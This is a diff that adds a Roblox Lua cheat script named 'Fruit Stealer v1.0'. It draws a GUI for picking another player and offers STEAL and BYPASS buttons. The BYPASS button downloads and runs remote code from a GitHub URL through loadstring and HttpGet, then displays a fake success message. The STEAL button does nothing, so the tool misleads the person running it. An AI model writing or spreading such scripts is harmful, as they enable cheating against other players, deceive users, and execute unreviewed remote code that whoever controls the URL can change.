@@ -1,0 +1,221 @@
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local screenGui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
+screenGui.Name = "FruitStealerGUI"
+screenGui.ResetOnSpawn = false
+
+local function addCorner(obj, radius)
+	local corner = Instance.new("UICorner")
+	corner.CornerRadius = UDim.new(0, radius)
+	corner.Parent = obj
+end
+
+local frame = Instance.new("Frame", screenGui)
+frame.Size = UDim2.new(0, 290, 0, 230)
+frame.Position = UDim2.new(0.35, 0, 0.35, 0)
+frame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+frame.Active = true
+frame.Draggable = true
+addCorner(frame, 10)
+
+local footer = Instance.new("TextLabel", frame)
+footer.Text = "Made by DRIXTHEGOAT7"
+footer.Size = UDim2.new(1, -10, 0, 20)
+footer.Position = UDim2.new(0, 5, 1, -25)
+footer.BackgroundTransparency = 1
+footer.TextColor3 = Color3.fromRGB(120, 120, 120)
+footer.Font = Enum.Font.SourceSans
+footer.TextSize = 14
+footer.TextXAlignment = Enum.TextXAlignment.Right
+
+local title = Instance.new("TextLabel", frame)
+title.Text = "Fruit Stealer v1.0"
+title.Size = UDim2.new(1, -35, 0, 30)
+title.Position = UDim2.new(0, 10, 0, 5)
+title.TextColor3 = Color3.new(1, 1, 1)
+title.Font = Enum.Font.SourceSansBold
+title.TextSize = 18
+title.BackgroundTransparency = 1
+title.TextXAlignment = Enum.TextXAlignment.Left
+
+local close = Instance.new("TextButton", frame)
+close.Size = UDim2.new(0, 25, 0, 25)
+close.Position = UDim2.new(1, -35, 0, 5)
+close.Text = "X"
+close.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+close.TextColor3 = Color3.new(1, 1, 1)
+close.Font = Enum.Font.SourceSansBold
+close.TextSize = 14
+addCorner(close, 5)
+close.MouseButton1Click:Connect(function()
+	screenGui:Destroy()
+end)
+
+local toggleDropdown = Instance.new("TextButton", frame)
+toggleDropdown.Text = "Select Player ▼"
+toggleDropdown.Size = UDim2.new(1, -20, 0, 30)
+toggleDropdown.Position = UDim2.new(0, 10, 0, 40)
+toggleDropdown.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+toggleDropdown.TextColor3 = Color3.new(1, 1, 1)
+toggleDropdown.Font = Enum.Font.SourceSansBold
+toggleDropdown.TextSize = 16
+addCorner(toggleDropdown, 6)
+
+local scroll = Instance.new("ScrollingFrame", frame)
+scroll.Position = UDim2.new(0, 10, 0, 75)
+scroll.Size = UDim2.new(1, -20, 0, 100)
+scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
+scroll.ScrollBarThickness = 5
+scroll.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+scroll.Visible = false
+addCorner(scroll, 6)
+
+local avatar = Instance.new("ImageLabel", frame)
+avatar.Size = UDim2.new(0, 60, 0, 60)
+avatar.Position = UDim2.new(0, 10, 0, 95)
+avatar.Image = "rbxasset://textures/ui/GuiImagePlaceholder.png"
+avatar.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+addCorner(avatar, 60)
+
+local displayNameLabel = Instance.new("TextLabel", frame)
+displayNameLabel.Text = "Display Name: -"
+displayNameLabel.Position = UDim2.new(0, 80, 0, 95)
+displayNameLabel.Size = UDim2.new(1, -90, 0, 20)
+displayNameLabel.TextColor3 = Color3.new(1, 1, 1)
+displayNameLabel.Font = Enum.Font.SourceSansBold
+displayNameLabel.TextSize = 14
+displayNameLabel.BackgroundTransparency = 1
+displayNameLabel.TextXAlignment = Enum.TextXAlignment.Left
+
+local userIdLabel = Instance.new("TextLabel", frame)
+userIdLabel.Text = "User ID: -"
+userIdLabel.Position = UDim2.new(0, 80, 0, 120)
+userIdLabel.Size = UDim2.new(1, -90, 0, 20)
+userIdLabel.TextColor3 = Color3.new(1, 1, 1)
+userIdLabel.Font = Enum.Font.SourceSansBold
+userIdLabel.TextSize = 14
+userIdLabel.BackgroundTransparency = 1
+userIdLabel.TextXAlignment = Enum.TextXAlignment.Left
+
+local profileBtn = Instance.new("TextButton", frame)
+profileBtn.Text = "View Profile"
+profileBtn.Position = UDim2.new(0, 80, 0, 145)
+profileBtn.Size = UDim2.new(1, -90, 0, 20)
+profileBtn.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
+profileBtn.TextColor3 = Color3.fromRGB(0, 170, 255)
+profileBtn.Font = Enum.Font.SourceSansBold
+profileBtn.TextSize = 14
+profileBtn.Visible = false
+addCorner(profileBtn, 5)
+
+local stealBtn = Instance.new("TextButton", frame)
+stealBtn.Text = "STEAL"
+stealBtn.Position = UDim2.new(0, 10, 0, 180)
+stealBtn.Size = UDim2.new(0.45, -5, 0, 30)
+stealBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+stealBtn.TextColor3 = Color3.fromRGB(255, 0, 0)
+stealBtn.Font = Enum.Font.SourceSansBold
+stealBtn.TextSize = 16
+addCorner(stealBtn, 5)
+
+local bypassBtn = Instance.new("TextButton", frame)
+bypassBtn.Text = "BYPASS"
+bypassBtn.Position = UDim2.new(0.55, 0, 0, 180)
+bypassBtn.Size = UDim2.new(0.45, -5, 0, 30)
+bypassBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+bypassBtn.TextColor3 = Color3.fromRGB(0, 255, 0)
+bypassBtn.Font = Enum.Font.SourceSansBold
+bypassBtn.TextSize = 16
+addCorner(bypassBtn, 5)
+
+local selectedUsername = nil
+
+local function showNotification(text, duration)
+	local notif = Instance.new("TextLabel", screenGui)
+	notif.Size = UDim2.new(0, 300, 0, 30)
+	notif.Position = UDim2.new(1, -310, 1, -50)
+	notif.AnchorPoint = Vector2.new(0, 1)
+	notif.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+	notif.TextColor3 = Color3.fromRGB(255, 255, 255)
+	notif.Text = text
+	notif.Font = Enum.Font.SourceSansBold
+	notif.TextSize = 14
+	addCorner(notif, 6)
+	task.delay(duration, function()
+		notif:Destroy()
+	end)
+end
+
+local function updateLayout()
+	frame.Size = scroll.Visible and UDim2.new(0, 290, 0, 330) or UDim2.new(0, 290, 0, 230)
+end
+
+toggleDropdown.MouseButton1Click:Connect(function()
+	scroll.Visible = not scroll.Visible
+	toggleDropdown.Text = scroll.Visible and "Select Player ▲" or "Select Player ▼"
+	updateLayout()
+end)
+
+local y = 0
+for _, plr in ipairs(Players:GetPlayers()) do
+	if plr ~= LocalPlayer then
+		local btn = Instance.new("TextButton", scroll)
+		btn.Text = plr.Name
+		btn.Size = UDim2.new(1, -10, 0, 25)
+		btn.Position = UDim2.new(0, 5, 0, y)
+		btn.BackgroundColor3 = Color3.fromRGB(65, 65, 65)
+		btn.TextColor3 = Color3.new(1, 1, 1)
+		btn.Font = Enum.Font.SourceSans
+		btn.TextSize = 14
+		addCorner(btn, 4)
+		y += 28
+		scroll.CanvasSize = UDim2.new(0, 0, 0, y)
+		btn.MouseButton1Click:Connect(function()
+			local thumb = Players:GetUserThumbnailAsync(plr.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size60x60)
+			avatar.Image = thumb
+			displayNameLabel.Text = "Display Name: " .. plr.DisplayName
+			userIdLabel.Text = "User ID: " .. plr.UserId
+			profileBtn.Visible = true
+			selectedUsername = plr.Name
+			local link = "https://www.roblox.com/users/" .. plr.UserId .. "/profile"
+			profileBtn.MouseButton1Click:Connect(function()
+				setclipboard(link)
+			end)
+			scroll.Visible = false
+			toggleDropdown.Text = "Select Player ▼"
+			updateLayout()
+		end)
+	end
+end
+
+local bypassed = false
+local bypassResetThread = nil
+
+bypassBtn.MouseButton1Click:Connect(function()
+	if bypassed then return end
+	bypassed = true
+	showNotification("BYPASS USER......", 3)
+
+	pcall(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/XNEOFF/FlyGuiV3/main/FlyGuiV3.txt"))()
+	end)
+
+	task.delay(4, function()
+		showNotification("USER HAVE BEEN BYPASSED YOU CAN STEAL NOW", 2)
+	end)
+
+	if bypassResetThread then
+		task.cancel(bypassResetThread)
+	end
+
+	bypassResetThread = task.delay(30, function()
+		bypassed = false
+	end)
+end)
+
+stealBtn.MouseButton1Click:Connect(function()
+	if not bypassed then
+		showNotification("YOU NEED TO BYPASS THE USER TO STEAL SOMEONE", 3)
+		return
+	end
+end)
